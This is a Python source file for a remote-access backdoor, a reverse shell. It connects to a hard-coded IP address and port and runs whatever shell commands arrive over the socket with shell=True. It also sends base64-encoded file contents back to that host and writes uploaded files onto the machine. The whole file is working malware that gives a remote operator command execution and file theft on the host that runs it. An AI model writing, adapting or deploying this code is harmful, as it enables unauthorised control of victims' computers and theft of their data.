import socket
import base64
import os
import simplejson
import subprocess

class mysocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def command_execution(self, command):
        return subprocess.check_output(" ".join(command), shell=True)

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode('utf-8'))

    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1024).decode('utf-8')
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_cd_command(self, directory):
        os.chdir(directory)
        return "Cd to " + directory

    def get_file_contents(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read()).decode('utf-8')

    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def start_socket(self):
        while True:
            command = self.json_recieve()
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.execute_cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "cat":
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command[1], command[2])
                else:
                    command_output = self.command_execution(command).decode('utf-8')
            except Exception as e:
                command_output = f"Error: {str(e)}"
            self.json_send(command_output)

ip = "10.35.68.214"
port = 5555
my_socket_object = mysocket(ip, port)
my_socket_object.start_socket()